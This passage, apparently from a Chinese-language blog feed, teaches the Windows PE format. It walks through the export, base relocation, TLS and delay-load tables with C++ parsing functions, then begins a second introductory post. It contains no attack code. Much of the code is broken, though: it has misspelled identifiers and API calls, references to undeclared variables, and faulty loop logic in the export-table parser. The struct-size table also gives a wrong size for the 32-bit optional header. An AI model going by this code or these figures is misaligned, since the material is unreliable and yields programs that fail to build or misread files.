class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_EXPORT_DIRECTORY</strong></p><ul><li><code>Characteristics</code>: 保留，必须为0</li><li><code>TimeDateStamp</code>: 时间戳</li><li><code>MajorVersion</code>: 主要版本号，主要和次要版本号可由用户设置</li><li><code>MinorVersion</code>: 次要版本号</li><li><code>Name</code>: 名称RVA，包含导出文件名称的ASCII字符串地址</li><li><code>Base</code>: 此映像中导出的起始序号，指定导出地址表（AddressOfFunctions）的起始序号，通常设置为1</li><li><code>NumberOfFunctions</code>: 导出函数的个数，导出地址表（AddressOfFunctions）中的条目数</li><li><code>NumberOfNames</code>: 按名称导出的函数个数，名称表（AddressOfFunctions）中的条目数，同样也是序号表（AddressOfNameOrdinals）中的条目数</li><li><code>AddressOfFunctions</code>: 导出地址表RVA</li><li><code>AddressOfNames</code>: 导出名称表RVA</li><li><code>AddressOfNameOrdinals</code>: 序号表RVA</li></ul></div><h3 id="解析导出表"><a href="#解析导出表" class="headerlink" title="解析导出表"></a>解析导出表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintExportTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// DOS</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 定位导出表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(<span class="built_in">RVAToFOA</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="keyword">if</span> (pExport-&gt;AddressFunctions == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;当前没有导出表!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* szDllName = (<span class="type">char</span>*)(<span class="built_in">RVAToFOA</span>(pExport-&gt;Name, buffer) + buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DllName: %s\n&quot;</span>, DllName);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Base: %#08x\n&quot;</span>, pExport-&gt;Base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NumberOfFunctions: %#08x\n&quot;</span>, pExport-&gt;NumberOfFunctions);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NumberOfNames: %#08x\n&quot;</span>, pExport-&gt;NumberOfNames);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AddressOfFunctions: %#08x\n&quot;</span>, pExport-&gt;AddressOfFunctions);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AddressOfNames: %#08x\n&quot;</span>, pExport-&gt;AddressOfNames);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AddressOfNameOrdinals: %#08x\n&quot;</span>, pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="comment">// 函数数量</span></span><br><span class="line">    DWORD dwNumberOfFunctions = pExport-&gt;NumberOfFunctions;</span><br><span class="line">    <span class="comment">// 函数名数量</span></span><br><span class="line">    DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line">    <span class="comment">// Base</span></span><br><span class="line">    DWORD dwBase = pExport-&gt;Base;</span><br><span class="line">    <span class="comment">// 导出地址表</span></span><br><span class="line">    PDWORD pExportAddrTable = (PDWORD)(<span class="built_in">RVAToFOA</span>(pExport-&gt;AddressOfFunctions, buffer) + buffer);</span><br><span class="line">    <span class="comment">// 导出名称表</span></span><br><span class="line">    PDWORD pExportNameTable = (PDWORD)(<span class="built_in">RVAToFOA</span>(pExport-&gt;AddressOfNames, buffer) + buffer);</span><br><span class="line">    <span class="comment">// 导出序号表</span></span><br><span class="line">    PWORD pExportIdTable = (PWORD)(<span class="built_in">RVAToFOA</span>(pExport-&gt;AddressOfNameOrdinals, buffer) + buffer);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwNumberOfFunctions; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(pExportAddrTable[i] == i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DWORD id = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; id &lt; dwNumberOfNames; id++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pExportIdTable[i] == id) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (id == dwNumberOfNames)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID: %x Address: %#08x Name[NULL]\n&quot;</span>, i + dwBase, pExportAddrTable[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span>* szFunName = (<span class="type">char</span>*)(<span class="built_in">RVAToFileOffset</span>(pExportNameTable[id], buffer) + buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID: %x Address: %#08x Name[%s]\n&quot;</span>, i + dwBase, pExportAddrTable[i], szFunName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IMAGE-BASE-RELOCATION-重定位表"><a href="#IMAGE-BASE-RELOCATION-重定位表" class="headerlink" title="_IMAGE_BASE_RELOCATION(重定位表)"></a>_IMAGE_BASE_RELOCATION(重定位表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>_IMAGE_BASE_RELOCATION</strong></p><ul><li><code>VirtualAddress</code>: 指向需要重定位地址的RVA，每个INAGE_BASE_RELOCATION只负责4kb大小分页内的重定位信息。因此结构中的VirtualAddress值为0x1000的倍数</li><li><code>SizeOfBlock</code>: imageBase结构体和TypeOffset的总和 重定位块的大小</li><li><code>TypeOffset[1]</code>: 自定义的一个字段，表示这个结构体下面会出现WORD类型的数组，该数组元素的就是硬编码在程序当中的偏移</li></ul><hr><p>自定义TypeOffset结构<br>typedef struct _TYPE<br>{<br>    WORD Offset: 12;    &#x2F;&#x2F; 大小2bit重定位的偏移<br>    WORD Type: 4;<br>} TYPE, *PTYPE;</p></div><div class="note warning"><p><strong>Windows的PE装载器进行PE重定位处理的操作原理流程</strong></p><ol><li>在应用程序当中查找硬编码位置</li><li>读取之后减去ImageBase，也就是用VA - 基址 &#x3D; RVA</li><li>加上实际加载地址得到真正的VA</li></ol><hr><p>其中最关键的就是找到硬编码的位置，而要找到硬编码的位置，首先要找到基址重定位表，该表位于.reloc区段，找到基址重定位表的正确打开方式是通过数据目录表<code>IMAGE_DATA_DIRECTORY</code>条目查找</p></div><h3 id="解析重定位表"><a href="#解析重定位表" class="headerlink" title="解析重定位表"></a>解析重定位表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintBaseRelocTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 自定义TypeOffset结构</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TYPE</span>&#123;</span><br><span class="line">        WORD Offset: <span class="number">12</span>;</span><br><span class="line">        WORD Type: <span class="number">4</span>;</span><br><span class="line">    &#125; TYPE, *PTYPE;</span><br><span class="line">    <span class="comment">// DOS</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// SECTION Header</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="built_in">IMAGE_FIRSET_SECTION</span>(pNtHeader);</span><br><span class="line">    <span class="comment">// 定位重定位表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirtory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(<span class="built_in">RVAToFOA</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="keyword">while</span>(pBaseReloc-&gt;SizeOfBlock != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 找到本0x1000个字节的起始位置</span></span><br><span class="line">        <span class="comment">// 重定位个数 = （SizeOfBlock - 8（IMAGE_BASE_RELOCATION）） / 2（每个TypeOffset是2个字节）</span></span><br><span class="line">        DWORD dwCount = (DWORD)(pBaseReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">        DWORD dwRVA = pBaseReloc-&gt;VirtualAddres;</span><br><span class="line">        PTYPE pRelocAddr = (PTYPE)(pBaseReloc + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SECTION: %#08X\n&quot;</span>, pSectionHeader-&gt;Name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;RVA: %#08X\n&quot;</span>, dwRVA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ITEMS: %x H / %d D\n&quot;</span>, pBaseReloc-&gt;SizeOfBlock, pBaseReloc-&gt;SizeOfBlock);</span><br><span class="line">        <span class="comment">// 找到下一个0x1000个字节</span></span><br><span class="line">        pBaseReloc = (PIMAGE_BASE_RELOCATION)((<span class="type">char</span>*)pBaseReloc + pBaseReloc-&gt;SizeOfBlock);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwCount; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            PDWORD pData = (PDWORD)(<span class="built_in">RVAToFOA</span>(pRelocAddr[i].Offset + dwRVA, buffer) + buffer);</span><br><span class="line">            DWORD pDataOffset = <span class="built_in">RVAToFOA</span>(pRelocAddr[i].Offset + dwRVA, buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SECTION: %#08x\n&quot;</span>, *pData);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;RVA: %#08x\n&quot;</span>, pRelocAddr[i].Offset + dwRVA);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OFFSET: %#08x\n\n&quot;</span>, pDataOffset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-TLS-DIRECTORY-TLS表"><a href="#IMAGE-TLS-DIRECTORY-TLS表" class="headerlink" title="_IMAGE_TLS_DIRECTORY(TLS表)"></a>_IMAGE_TLS_DIRECTORY(TLS表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_TLS_DIRECTORY32</span> &#123;</span><br><span class="line">    DWORD   StartAddressOfRawData;</span><br><span class="line">    DWORD   EndAddressOfRawData;</span><br><span class="line">    DWORD   AddressOfIndex;             <span class="comment">// PDWORD</span></span><br><span class="line">    DWORD   AddressOfCallBacks;         <span class="comment">// PIMAGE_TLS_CALLBACK *</span></span><br><span class="line">    DWORD   SizeOfZeroFill;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            DWORD Reserved0 : <span class="number">20</span>;</span><br><span class="line">            DWORD Alignment : <span class="number">4</span>;</span><br><span class="line">            DWORD Reserved1 : <span class="number">8</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>_IMAGE_TLS_DIRECTORY32</strong></p><ul><li><code>StartAddressOfRawData</code>: TLS初始化数据起始地址</li><li><code>EndAddressOfRawData</code>: TLS初始化结束地址，两个正好定位一个范围，范围放初始化的值</li><li><code>AddressOfIndex</code>: TLS索引位置</li><li><code>AddressOfCallBacks</code>: TLS回调函数的数组指针</li><li><code>SizeOfZeroFill</code>: 填充0的个数</li><li><code>Characteristics</code>: 保留</li></ul><hr><p>TLS: 线程本地存储器，可以将数据与执行的特定线程联系起来。怎么理解？</p><ol><li>如果一个变量是全局的，那么所有线程访问的是同一份，某一个线程对其修改会影响其他所有线程。如果我们需要一个变量在每个线程中都能访问，并且值在每个线程中互不影响，这就是TLS。</li><li>线程局部存储在不同平台有不同的实现，可移植性不好。线程局部存储不难实现，最简单的办法就是建立一个全局表，通过当前线程ID去查询相应的数据，因为各个线程ID不同，查到的数据自然也不同。</li></ol></div><h3 id="解析TLS表"><a href="#解析TLS表" class="headerlink" title="解析TLS表"></a>解析TLS表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintTLSTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// DOS</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 定位TLS表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.VirtualAddres + IMAGE_DIRECTORY_ENTRY_TLS);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(<span class="built_in">RVAToFOA</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;StartAddressOfRawData: %#08x\n&quot;</span>, pTLS-&gt;StartAddressOfRawData);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;EndAddressOfRawData: %#08x\n&quot;</span>, pTLS-&gt;EndAddressOfRawData);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;AddressOfIndex: %#08x\n&quot;</span>, pTLS-&gt;AddressOfIndex);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;AddressOfCallBacks: %#08x\n&quot;</span>, pTLS-&gt;AddressOfCallBacks);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;SizeOfZeroFill: %#08x\n&quot;</span>, pTLS-&gt;SizeOfZeroFill);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;Characteristics: %#08x\n&quot;</span>, pTLS-&gt;Characteristics);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-DELAYLOAD-DESCRIPTOR-延时加载表"><a href="#IMAGE-DELAYLOAD-DESCRIPTOR-延时加载表" class="headerlink" title="_IMAGE_DELAYLOAD_DESCRIPTOR(延时加载表)"></a>_IMAGE_DELAYLOAD_DESCRIPTOR(延时加载表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DELAYLOAD_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD AllAttributes;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            DWORD RvaBased : <span class="number">1</span>;             <span class="comment">// Delay load version 2</span></span><br><span class="line">            DWORD ReservedAttributes : <span class="number">31</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; Attributes;</span><br><span class="line"></span><br><span class="line">    DWORD DllNameRVA;                       <span class="comment">// RVA to the name of the target library (NULL-terminate ASCII string)</span></span><br><span class="line">    DWORD ModuleHandleRVA;                  <span class="comment">// RVA to the HMODULE caching location (PHMODULE)</span></span><br><span class="line">    DWORD ImportAddressTableRVA;            <span class="comment">// RVA to the start of the IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    DWORD ImportNameTableRVA;               <span class="comment">// RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData)</span></span><br><span class="line">    DWORD BoundImportAddressTableRVA;       <span class="comment">// RVA to an optional bound IAT</span></span><br><span class="line">    DWORD UnloadInformationTableRVA;        <span class="comment">// RVA to an optional unload info table</span></span><br><span class="line">    DWORD TimeDateStamp;                    <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// Otherwise, date/time of the target DLL</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR;</span><br></pre></td></tr></table></figure><h3 id="解析延时加载表"><a href="#解析延时加载表" class="headerlink" title="解析延时加载表"></a>解析延时加载表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOS</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"><span class="comment">// NT</span></span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line"><span class="comment">// 定位DelayImportTable</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);</span><br><span class="line"><span class="comment">// 填充结构体</span></span><br><span class="line">PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad = (PIMAGE_DELAYLOAD_DESCRIPTOR)(<span class="built_in">RVAToFileOffset</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line"><span class="type">char</span>* szDllName = (<span class="type">char</span>*)(<span class="built_in">RVAToFileOffset</span>(pDelayLoad-&gt;DllNameRVA, buffer) + buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, szDllName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Attributes: %#08x\n&quot;</span>, pDelayLoad-&gt;Attributes);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ModuleHandleRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;ModuleHandleRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImportAddressTableRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;ImportAddressTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImportNameTableRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;ImportNameTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;BoundImportAddressTableRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;BoundImportAddressTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UnloadInformationTableRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;UnloadInformationTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;TimeDateStamp: %#08x\n&quot;</span>, pDelayLoad-&gt;TimeDateStamp);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows PE</title>
      <link href="/bd80384e.html"/>
      <url>/bd80384e.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>Windows PE</strong></p><ul><li>可执行文件（Executable file）指的是可以由操作系统进行加载执行的文件</li><li>可执行文件的格式：<ul><li>Windows 平台<br>  PE（Portable Executable）文件结构</li><li>Linux 平台<br>  ELF（Executable and Linking Format）文件结构</li></ul></li></ul></div><span id="more"></span><h2 id="PE-文件结构"><a href="#PE-文件结构" class="headerlink" title="PE 文件结构"></a>PE 文件结构</h2><h3 id="PE-文件的整体结构"><a href="#PE-文件的整体结构" class="headerlink" title="PE 文件的整体结构"></a>PE 文件的整体结构</h3><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/PE%E7%BB%93%E6%9E%84.png' data-fancybox='default' data-caption='PE 结构示例图'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/PE%E7%BB%93%E6%9E%84.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/PE%E7%BB%93%E6%9E%84.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="PE 结构示例图"></a><span class='image-caption'>PE 结构示例图</span></div></div><h3 id="PE-文件主要结构"><a href="#PE-文件主要结构" class="headerlink" title="PE 文件主要结构"></a>PE 文件主要结构</h3><div class="note message"><p>PE 文件结构体宽度</p></div><table><thead><tr><th>结构体</th><th>宽度(字节)</th></tr></thead><tbody><tr><td>IMAGE_DOS_HEADER</td><td>64</td></tr><tr><td>IMAGE_FILE_HEADER</td><td>20</td></tr><tr><td>INAGE_OPTIONAL_HEADER32</td><td>244</td></tr><tr><td>IMAGE_SECTION_HEADER</td><td>40</td></tr></tbody></table><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%A4%A7%E5%B0%8F.png' data-fancybox='default' data-caption='PE 文件结构大小示例图'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%A4%A7%E5%B0%8F.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%A4%A7%E5%B0%8F.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="PE 文件结构大小示例图"></a><span class='image-caption'>PE 文件结构大小示例图</span></div></div><h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" 